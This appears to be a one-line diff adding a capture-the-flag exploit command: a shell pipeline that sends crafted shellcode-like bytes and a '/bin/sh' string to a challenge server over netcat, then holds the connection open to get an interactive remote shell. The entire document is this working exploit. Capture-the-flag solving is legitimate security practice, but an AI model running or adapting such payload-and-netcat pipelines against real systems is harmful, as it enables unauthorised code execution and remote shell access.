@@ -1,0 +1,1 @@
+(echo -ne 'aIIIQXPQTRIIIQQQQQaPP X PSTQTTSSa\n'; read; echo 'a'; read; echo -ne '/bin/sh\x00\x00\x00\x00';cat)|nc chall.polygl0ts.ch 9000
